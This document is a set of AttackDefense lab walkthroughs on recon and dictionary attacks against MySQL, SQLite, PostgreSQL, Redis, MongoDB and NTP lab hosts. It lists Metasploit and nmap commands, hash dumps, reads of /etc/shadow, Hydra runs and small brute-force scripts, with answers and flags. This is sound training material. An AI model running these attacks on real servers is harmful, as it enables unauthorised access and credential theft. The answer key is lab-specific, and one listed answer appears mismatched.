Commands: 
.schema invoices 
select count(*) from invoices where total between 2 and 6; 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
References: 
 
1.
SQLite (​https://www.sqlite.org/​)  
 
 
 
 
Name 
MySQL Recon: Basics 
URL 
https://www.attackdefense.com/challengedetails?cid=529  
Type 
Network Recon : SQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. What is the version of MySQL server? 
 
Answer: ​5.5.62 
 
Command:​ nmap -sV 192.71.145.3 
 
 
 
Q2. What command is used to connect to remote MySQL database? 
 
Command: ​mysql -h 192.71.145.3 -u root 
 
 
 
 
 
 
 
Q3. How many databases are present on the database server? 
 
Answer: ​11 
 
Command:​ show databases; 
 
 
 
Q4. How many records are present in table “authors”? This table is present inside the 
“books” database. 
 
Answer: ​10 
 
 
 
 
Commands: 
use books; 
select count(*) from authors; 
 
 
 
 
Q5. Dump the schema of all databases from the server using suitable metasploit module? 
 
Commands: 
msfconsole 
use auxiliary/scanner/mysql/mysql_schemadump 
set RHOSTS 192.71.145.3 
set USERNAME root 
set PASSWORD "" 
exploit 
 
 
 
 
 
 
 
 
 
 
 
 
 
Q6. How many directories present in the 
/usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the 
names. 
 
Answer: ​2 
/tmp, /root 
 
Commands: 
 
use auxiliary/scanner/mysql/mysql_writable_dirs 
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt 
set RHOSTS 192.71.145.3 
set VERBOSE false 
set PASSWORD "" 
exploit 
 
 
 
 
 
 
Q7. How many of sensitive files present in 
/usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the 
names. 
 
Answer: ​10 
/etc/passwd, /etc/shadow, /etc/group, /etc/mysql/my.cnf, /etc/hosts, /etc/hosts.allow, 
/etc/hosts.deny, /etc/issue, /etc/fstab, /proc/version 
 
Commands: 
use auxiliary/scanner/mysql/mysql_file_enum 
set RHOSTS 192.71.145.3 
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt 
set PASSWORD "" 
exploit 
 
 
 
 
 
 
 
 
 
Q8. Find the system password hash for user "root". 
 
Answer: 
S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhg
qnClY2.KC.vA/ 
 
Commands: 
mysql -h 192.71.145.3 -u root 
select load_file("/etc/shadow"); 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Q9. How many database users are present on the database server? Lists their names and 
password hashes. 
 
Answer: ​8 
debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D 
root: 
filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B 
ultra:*827EC562775DC9CE458689D36687DCED320F34B0 
guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646 
sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0 
udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9 
sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14 
 
Commands: 
use auxiliary/scanner/mysql/mysql_hashdump 
set RHOSTS 192.71.145.3 
set USERNAME root 
set PASSWORD "" 
exploit 
 
 
 
 
Q10. Check whether anonymous login is allowed on MySQL Server. 
 
Answer: ​Yes 
 
Command:​ nmap --script=mysql-empty-password -p 3306 192.71.145.3 
 
 
 
Q11. Check whether “InteractiveClient” capability is supported on the MySQL server. 
 
Answer: ​Yes 
 
Command: ​nmap --script=mysql-info -p 3306 192.71.145.3 
 
 
 
Q12. Enumerate the users present on MySQL database server using mysql-users nmap 
script. 
 
Answer: ​root, debian-sys-maint, guest, sigver, sysadmin, udadmin, ultra 
 
Command: ​nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 
192.71.145.3 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Q13. List all databases stored on the MySQL Server using nmap script. 
 
Answer: ​information_schema, books, data, mysql, password, performance_schema, secret, 
store, upload, vendors, videos 
 
Command:​ nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 
3306 192.71.145.3 
 
 
 
 
Q14. Find the data directory used by mysql server using nmap script. 
 
Answer: ​/var/lib/mysql 
 
Command:​ nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 
3306 192.71.145.3 
 
 
 
 
Q15. Check whether File Privileges can be granted to non admin users using mysql-audit 
nmap script. 
 
Answer: ​No, File privileges cannot be granted. 
 
Command:​ nmap --script=mysql-audit --script-args 
"mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/n
selib/data/mysql-cis.audit'" -p 3306 192.71.145.3 
 
 
 
 
 
 
 
Q16. Dump all user hashes using  nmap script. 
 
Answer:  
debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D 
filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B 
ultra:*827EC562775DC9CE458689D36687DCED320F34B0 
guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646 
sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0 
udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9 
sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14 
 
 
Command:​ nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 
3306  192.71.145.3 
 
 
 
Q17. Find the number of records stored in table “authors” in database “books” stored on 
MySQL Server using mysql-query nmap script. 
 
Answer: ​10 
 
Command: ​nmap --script=mysql-query --script-args="query='select count(*) from 
books.authors;',username='root',password=''" -p 3306 192.71.145.3 
 
 
 
 
 
 
References: 
 
1.
MySQL (​https://www.mysql.com/​)  
2.
Metasploit Module: MySQL Password Hashdump 
(​https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_hashdump​)  
3.
Metasploit Module: MYSQL File/Directory Enumerator 
(​https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_file_enum​)  
4.
Metasploit Module: MYSQL Directory Write Test 
(​https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_writable_dirs​)  
5.
Metasploit Module: MYSQL Schema Dump 
(​https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_schemadump​)  
6.
Nmap Script: mysql-empty-password 
(​https://nmap.org/nsedoc/scripts/mysql-empty-password.html​)  
7.
Nmap Script: mysql-info (​https://nmap.org/nsedoc/scripts/mysql-info.html​)  
8.
Nmap Script: mysql-users (​https://nmap.org/nsedoc/scripts/mysql-users.html​)  
9.
Nmap Script: mysql-databases (​https://nmap.org/nsedoc/scripts/mysql-databases.html​)  
10. Nmap Script: mysql-variables (​https://nmap.org/nsedoc/scripts/mysql-variables.html​)  
11. Nmap Script: mysql-audit (​https://nmap.org/nsedoc/scripts/mysql-audit.html​)  
12. Nmap Script: mysql-query (​https://nmap.org/nsedoc/scripts/mysql-query.html​)  
13. Nmap Script: mysql-dump-hashes 
(​https://nmap.org/nsedoc/scripts/mysql-dump-hashes.html​)  
 
 
 
Name 
SQLite Recon: Dictionary Attack 
URL 
https://www.attackdefense.com/challengedetails?cid=530  
Type 
Network Recon : SQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Find is the PRAGMA key needed to decrypt “encrypted.db” database. Use sqlcipher 
tool with password wordlist: /home/student/rockyou.txt 
 
Answer:​ football 
 
Solution:  
 
We have to write a custom script to perform a dictionary attack on the sqlite database file 
 
Python Script: 
 
#! /usr/bin/python 
from pysqlcipher import dbapi2 as sqlite 
import sys 
 
conn = sqlite.connect(sys.argv[1]) 
c = conn.cursor() 
 
f = open(sys.argv[2], 'r') 
for line in f: 
 
st = line.strip() 
 
print "Trying: " + st 
 
c.execute("PRAGMA key='" + st + "'") 
 
try: 
 
c.execute("SELECT name FROM sqlite_master WHERE type='table';") 
 
print "key is '" + st + "'" 
 
break 
 
except: 
 
pass 
 
 
 
Commands: 
chmod +x break.py 
./break.py /home/student/encrypted.db /home/student/rockyou.txt 
 
 
  
 
 
Q2. Which PRAGMA cipher was used to prepare encrypt database  “encrypted.db”? 
 
Answer:​ Apache2 default page 
 
Commands: 
sqlcipher encrypted.db 
PRAGMA key='football'; 
PRAGMA cipher;  
 
 
 
 
Q3. Fetch the flag from “FLAG” table obtained by decrypting “encrypted.db” database. 
 
Answer:​ 5c5679bc2b5c661e4d0db98a5cab1c31 
 
Command: ​select * from flag; 
 
 
 
 
References: 
 
1.
SQLCipher (​https://www.zetetic.net/sqlcipher/​)  
2.
SQLCipher Bruteforcer (​https://github.com/G4brym/sqlcipher-bruteforcer​)  
 
 
 
Name 
PostgreSQL Recon: Basics 
URL 
https://www.attackdefense.com/challengedetails?cid=531  
Type 
Network Recon : SQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. What is the version of Postgres server? 
 
Answer:​ 9.5.14 
 
Commands:  
msfconsole 
use auxiliary/scanner/postgres/postgres_version 
set RHOSTS 192.227.171.3 
exploit 
 
 
 
Q2. How many databases are present on the server?  
 
Answer: ​5 
 
 
 
 
 
Commands: 
use auxiliary/scanner/postgres/postgres_schemadump 
set RHOSTS 192.227.171.3 
exploit  
 
 
 
 
Q3. Create a database user named Hacker on the server.  
 
Commands: 
use auxiliary/admin/postgres/postgres_sql 
set RHOSTS 192.227.171.3 
set SQL CREATE USER hacker; 
set VERBOSE true 
exploit 
 
 
 
Q4. Find the system password hash of user "dbadministrator". 
 
Answer: 
B735QF1wLcP07bEhgotlCnKZMkacKV1KAhcJfE8RCzUcGjd2WHmUwJf5Ru3mDXWD960rwS
O96ToWOMzEATiJy1 
 
Commands: 
use auxiliary/admin/postgres/postgres_readfile 
set RFILE /etc/shadow 
set RHOSTS 192.227.171.3 
exploit  
 
 
 
 
 
 
 
Q5. How many database users are present on the database server? Lists their names and 
password hashes. 
 
Answer:  
dav: md52c91aab2f10da51700e18f7e4c359900 
jack: md5b06a9f355bd8a004b404dc06e86a5ab6 
jackson: md5c0f8eaebe9735029bb1553f670f01acf 
peter: md5c991abdff30a5aada65694f199f0416a 
 
Commands: 
use auxiliary/scanner/postgres/postgres_hashdump 
set RHOSTS 192.227.171.3 
exploit 
 
 
 
Q6. Retrieve the flag kept in FLAG file located at home directory of user dbadministrator. 
 
Answer: ​af0cd4efc9e34a60050e61faac91842d 
 
Commands:  
use auxiliary/admin/postgres/postgres_readfile 
set RFILE /home/dbadministrator/FLAG 
set RHOSTS 192.227.171.3 
exploit 
 
 
 
Q7. List all the databases stored on the postgresql server using interactive client psql. 
 
Answer: ​adminzone, data, employee, junk, postgres, storage, template0, template1 
 
Commands: 
psql -h 192.227.171.3 -U postgres 
\l 
 
 
 
Q8. Find the number of records present in table “company” in database “employee” 
stored on the postgresql server using interactive client psql. 
 
Answer: ​9 
 
Commands: 
\c employee 
select count(*) from company; 
 
 
 
 
 
 
 
 
 
References: 
 
1.
PostgreSQL (​https://www.postgresql.org/​)  
2.
Metasploit Module: PostgreSQL Version Probe 
(​https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_version​)  
3.
Metasploit Module:  Postgres Schema Dump 
(​https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_schemadump​)  
4.
Metasploit Module: PostgreSQL Server Generic Query 
(​https://www.rapid7.com/db/modules/auxiliary/admin/postgres/postgres_sql​)  
5.
Metasploit Module: Postgres Password Hashdump 
(​https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_hashdump​)  
6.
Metasploit Module: PostgreSQL Server Generic Query 
(​https://www.rapid7.com/db/modules/auxiliary/admin/postgres/postgres_readfile​)  
 
 
 
Name 
MySQL Recon: Dictionary Attack 
URL 
https://www.attackdefense.com/challengedetails?cid=532  
Type 
Network Recon : SQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Find the password of user “root” which is required to access the MySQL server. Use 
suitable metasploit module with password dictionary: 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
 
Answer: ​root:catalina 
 
Commands: 
msfconsole 
use auxiliary/scanner/mysql/mysql_login 
set RHOSTS 192.149.194.3 
set USERNAME root 
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
set VERBOSE false 
set STOP_ON_SUCCESS true 
exploit 
 
 
 
 
 
 
 
 
 
 
 
 
Q2. Find the password of user “root” which is required to access the MySQL server. Use 
Hydra with password dictionary: 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
 
Answer: ​root:catalina 
 
Command: ​hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
192.149.194.3 mysql 
 
 
 
 
References: 
 
1.
MySQL (​https://www.mysql.com/​)  
2.
Metasploit Module: MySQL Login Utility 
(​https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login​)  
3.
THC Hydra (​https://tools.kali.org/password-attacks/hydra​)  
 
 
 
Name 
PostgreSQL Recon: Dictionary Attack 
URL 
https://www.attackdefense.com/challengedetails?cid=533  
Type 
Network Recon : SQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Find the password of user “postgres” which is required to access the postgres 
server. Use suitable metasploit module with password dictionary: 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
 
Answer:​ adminpasswd 
 
Commands:  
msfconsole 
use auxiliary/scanner/postgres/postgres_login 
set RHOSTS 192.245.140.3 
set USERNAME postgres 
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
set VERBOSE false 
set STOP_ON_SUCCESS true 
exploit 
 
 
 
 
 
 
 
 
 
 
 
 
Q2. Find the password of user “postgres” which is required to access the postgres 
server. Use Hydra with password dictionary: 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
 
Answer: ​adminpasswd 
 
Commands:​ hydra -l postgres  -P 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.245.140.3 postgres 
 
 
 
Q3. Find the password of user “postgres” using nmap script with password wordlist: 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
 
Answer: ​adminpasswd 
 
 
 
 
 
 
 
Commands: 
echo "postgres" > users 
nmap -p 5432 --script pgsql-brute --script-args 
userdb=users,passdb=/usr/share/metasploit-framework/data/wordlists/unix_passwords.t
xt 192.245.140.3 
 
 
 
References: 
 
1.
PostgreSQL (​https://www.postgresql.org/​)  
2.
Metasploit Module: PostgreSQL Login Utility 
(​https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_login​)  
3.
Nmap Script: pgsql-brute (​https://nmap.org/nsedoc/scripts/pgsql-brute.html​)  
4.
THC Hydra (​https://tools.kali.org/password-attacks/hydra​)  
 
 
 
Name 
NTP Recon: Basics 
URL 
https://www.attackdefense.com/challengedetails?cid=534  
Type 
Network Recon : NTP Servers 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Q1. What is the version of the NTP server? 
 
Answer:​ v4 
 
Command: ​nmap -sU -sV -p 123 192.205.96.3 
 
 
 
Q2. What is the command used to query current time from the ntp server using ntpq? 
 
Command: ​ntpq -c "rv 0 clock" 192.205.96.3 
 
 
 
 
Q3. What is the command used to query current time from the ntp server using ntpdate? 
 
Command: ​ntpdate -q 192.205.96.3 
 
 
 
Q4. What is the kernel version of target machine running NTP server? 
 
Answer:​ Linux/4.15.0-32-generic 
 
Command: ​nmap -sU -p 123 --script ntp-info 192.205.96.3 
 
 
 
Q5. How many pool server are being used by the target NTP? 
 
Answer: ​5 
 
Commands:  
ntpq 192.205.96.3 
lpeers 
 
 
 
References: 
 
1.
ntpd (​https://linux.die.net/man/8/ntpd​)  
2.
ntpq (​https://linux.die.net/man/8/ntpq​)  
3.
ntpdate (​https://linux.die.net/man/8/ntpdate​) 
4.
Nmap Script: ntp-info (​https://nmap.org/nsedoc/scripts/ntp-info.html​)  
 
 
 
Name 
Redis Server: Basics 
URL 
https://www.attackdefense.com/challengedetails?cid=541  
Type 
Network Recon : NoSQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Find the version of redis server using nmap. 
 
Answer: ​5.0.2 
 
Command: ​nmap -sV -p- 192.249.20.3 
 
 
 
Q2. Find the version of redis server use redis-cli. 
 
Answer: ​5.0.2 
 
 
 
 
 
Commands: 
redis-cli -h 192.249.20.3 
INFO  
 
  
 
Q3. Find the version of redis server using redis_server metasploit module. 
 
Answer: ​5.0.2 
 
Commands:  
msfconsole 
use auxiliary/scanner/redis/redis_server 
set RHOSTS 192.249.20.3 
exploit 
 
 
 
Q4. List the active channels present on the redis server using appropriate nmap script. 
 
Answer: ​welcome 
 
Command: ​nmap -p 6379 --script redis-info 192.249.20.3 
 
 
 
 
 
 
Q5. How many key values pairs are stored on the redis server? 
 
Answer: ​10 
 
Commands: 
redis-cli -h 192.249.20.3 
KEYS * 
 
 
 
 
 
 
 
 
 
 
  
Q6. Fetch the string value stored in key “flag” on the redis server. 
 
Answer: ​556797193b6a7fe004ac4c7d596f88a4 
 
Commands:  
redis-cli -h 192.249.20.3 
get flag 
 
 
 
 
Q7. List all items present in the list stored in key “welcome_message” on the redis 
server. 
 
Answer: ​Redis, Recon, Basic, Lab 
 
Command:​ LRANGE welcome_message 0 -1 
 
 
Q8. List all items present in the set stored in key “admin” on the redis server. 
 
Answer: ​andrew, robin, elise, john 
 
Command: ​SMEMBERS admin 
 
 
 
Q9. What is the value stored in “username” field in the hash stored in key “user-1” on the 
redis server? 
 
Answer: ​david 
 
Commands:  
HGETALL user-1 
HGET user-1 username 
 
 
 
 
 
 
 
 
 
 
 
 
  
 
Q10. How many members are present in sorted set stored in key “patches” on the redis 
server? 
 
Answer: ​4 
 
Command: ​ZCARD patches 
 
 
 
Q11. What is the score of member “bash” in sorted set stored in key “patches” on the 
redis server? 
 
Answer: ​125 
 
Command: ​ZSCORE patches bash 
 
 
 
 
 
 
 
 
Q12. What is the cardinality of  the set observed by the HyperLogLog at key “OS” on the 
redis server? 
 
Answer: ​5 
 
Command: ​PFCOUNT OS 
 
 
 
 
References: 
 
1.
Redis (​https://redis.io/​) 
 
2.
redis-cli (​https://redis.io/topics/rediscli​)  
3.
Nmap Script: redis-info (https://nmap.org/nsedoc/scripts/redis-info.html)  
4.
Metasploit Module: Redis Command Execute Scanner 
 (​https://www.rapid7.com/db/modules/auxiliary/scanner/redis/redis_server​)  
 
 
 
Name 
Redis Server: Dictionary Attack 
URL 
https://www.attackdefense.com/challengedetails?cid=542  
Type 
Network Recon : NoSQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Find the authentication password required to access the redis server using suitable 
nmap script with password dictionary: /usr/share/nmap/nselib/data/passwords.lst 
 
Answer: ​daniel 
 
Command: ​nmap -p 6379 --script redis-brute 192.143.111.3 
 
 
 
Q2. Find the authentication password required to access the redis server using suitable 
metasploit module with password dictionary: 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
 
 
Answer: ​daniel 
 
Commands: 
msfconsole 
use auxiliary/scanner/redis/redis_login 
set RHOSTS 192.143.111.3 
exploit 
 
 
 
 
Q3. Fetch the string value stored in key “flag” on the redis server. 
 
Answer: ​b5b9aff5cb345d3110cb71bdd0be1314 
 
Commands:  
redis-cli -h 192.143.111.3 
AUTH daniel 
GET flag 
 
 
 
Q4. List all the members of the sorted set stored in key “patches” which have score 
between 10 and 40. 
 
Answer: ​apache, bash, squid, nginx 
 
Commands:  
AUTH daniel 
ZRANGEBYSCORE patches 10 40 
 
 
 
Q5. A message is being published to channel “welcome” every second.  What is the 
message. 
 
Answer: ​welcome to redis recon lab 
 
Commands:  
AUTH daniel 
SUBSCRIBE welcome 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
References: 
 
1.
Redis (​https://redis.io/​) 
 
2.
redis-cli (​https://redis.io/topics/rediscli​)  
3.
Nmap Script: redis-brute (​https://nmap.org/nsedoc/scripts/redis-brute.html​)  
4.
Metasploit Module: Redis Login Utility 
 (​https://www.rapid7.com/db/modules/auxiliary/scanner/redis/redis_login​)  
 
 
 
Name 
MongoDB Server: Basics 
URL 
https://www.attackdefense.com/challengedetails?cid=543  
Type 
Network Recon : NoSQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Find the version of MongoDB server using nmap. 
 
Answer: ​3.6.3 
 
Command: ​nmap -sV -p- 192.195.41.3 
 
 
 
Q2. Find the version of MongoDB server using available mongo clients. 
 
Answer: ​3.6.3 
 
Command: ​mongo 192.195.41.3 
 
 
 
 
 
Q3. Find the number of inserted documents using available nmap scripts. 
 
Answer: ​29353 
 
Command: ​nmap -p 27017 --script mongodb-info 192.195.41.3 | grep -A5 -B5 document 
 
 
 
Q4. List the name of databases stored on the MongoDB server using available nmap 
scripts. 
 
Answer: ​city, config, local, admin 
 
Command: ​nmap -p 27017 --script mongodb-databases 192.195.41.3 
 
 
 
 
 
Q5. List the name of databases stored on the MongoDB server using available mongo 
clients. 
 
Answer: ​admin, city, config, local 
 
Commands:  
mongo 192.195.41.3 
show dbs 
 
 
 
 
 
 
 
 
Q6. List the name of collections in database “city” stored on the MongoDB server. 
 
Answer: ​city 
 
Commands: 
use city 
show collections 
 
 
 
Q7. Find the number of documents present in collection “city” in database “city” stored 
on the mongoDB server. 
 
Answer: ​29353 
 
Commands: 
use city 
db.city.find().count()  
 
 
 
 
 
 
 
 
 
 
References: 
 
1.
MongoDB (​https://www.mongodb.com/​) 
 
2.
mongo (​https://docs.mongodb.com/manual/mongo/​)  
3.
Nmap Script: mongodb-info (​https://nmap.org/nsedoc/scripts/mongodb-info.html​)  
4.
Nmap Script: mongodb-databases 
(​https://nmap.org/nsedoc/scripts/mongodb-databases.html​)  
 
 
 
Name 
MongoDB Server: Dictionary Attack 
URL 
https://www.attackdefense.com/challengedetails?cid=544  
Type 
Network Recon : NoSQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Find the credentials required to access database “flag”. Use nmap script with 
username list: /usr/share/nmap/nselib/data/usernames.lst and password dictionary: 
/usr/share/nmap/nselib/data/passwords.lst. 
 
Answer: ​admin:cookie 
 
Command: ​nmap -p 27017 --script mongodb-brute --script-args mongodb-brute.db=flag 
192.179.236.3 
 
 
 
Q2. Find the credentials required to access database “users”. Use mongodb_login 
module  with username list: /share/wordlists/metasploit/unix_users.txt and password 
dictionary: /usr/share/wordlists/metasploit/unix_passwords.txt. 
 
 
Answer: ​root:yellow 
 
Commands:  
msfconsole 
use auxiliary/scanner/mongodb/mongodb_login 
set db users 
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt 
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt 
set STOP_ON_SUCCESS true 
set RHOSTS 192.179.236.3 
exploit 
 
 
 
 
Q3. Find the value stored in key “flag” in the document present in collection “flag” in 
database “flag”. 
 
Answer: ​a3c0795691a0a6d3f55a17b73490920a 
 
Command: ​mongo  -u admin -p cookie --authenticationDatabase flag -host 192.179.236.3 
 
 
 
Q4. Find the value stored in key “name” in the document present in collection “users” in 
database “users”. 
 
Answer: ​Stephen 
 
Command: ​mongo  -u root -p yellow --authenticationDatabase users -host 192.179.236.3 
 
 
 
References: 
 
1.
MongoDB (​https://www.mongodb.com/​) 
 
2.
mongo (​https://docs.mongodb.com/manual/mongo/​)  
3.
Nmap Script: mongodb-brute (​https://nmap.org/nsedoc/scripts/mongodb-brute.html​)  
4.
Metasploit Module: MongoDB Login Utility 
(​https://www.rapid7.com/db/modules/auxiliary/scanner/mongodb/mongodb_login​)  
 
 
 
Name 
MongoDB Server: Dictionary Attack II 
URL 
https://www.attackdefense.com/challengedetails?cid=545  
Type 
Network Recon : NoSQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Find the password of user “david” which is required to access database “flag”. 
Metasploit modules and nmap script doesn't support MONGODB-SHA1. 
 
Answer: ​password1 
 
Solution:  
 
Custom Script: 
 
#!/bin/bash 
while read F ; do 
echo "Trying "$F 
nohup mongo  -u $1 -p $F --authenticationDatabase $2 -host $3 > nohup.out 2>/dev/null & 
sleep .5 
count=$(cat nohup.out| grep "Authentication failed" |wc -l) 
if [[ $count -eq 0 ]] 
then 
 
echo "Possible Password: "$F 
 
break 
fi 
done < $4 
 
 
 
 
 
 
 
 
Commands: 
chmod +x break.sh 
gzip -d /usr/share/wordlists/rockyou.txt.gz 
./break.sh david flag 192.224.124.3 /usr/share/wordlists/rockyou.txt 
 
 
 
 
 
 
 
 
 
Q2. Find the value stored in key “flag” in the document present in collection “flag” in 
database “flag”. 
 
Answer: ​77f28644a4a15f90d450e35b46d0d67e 
 
Commands: 
mongo  -u david -p password1 --authenticationDatabase flag -host 192.224.124.3 
use flag 
db.flag.find()  
 
 
 
 
References: 
 
1.
MongoDB (​https://www.mongodb.com/​) 
 
2.
mongo (​https://docs.mongodb.com/manual/mongo/​)  
 
 
 
Name 
ArangoDB Recon: Basics 
URL 
https://www.attackdefense.com/challengedetails?cid=546  
Type 
Network Recon : NoSQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
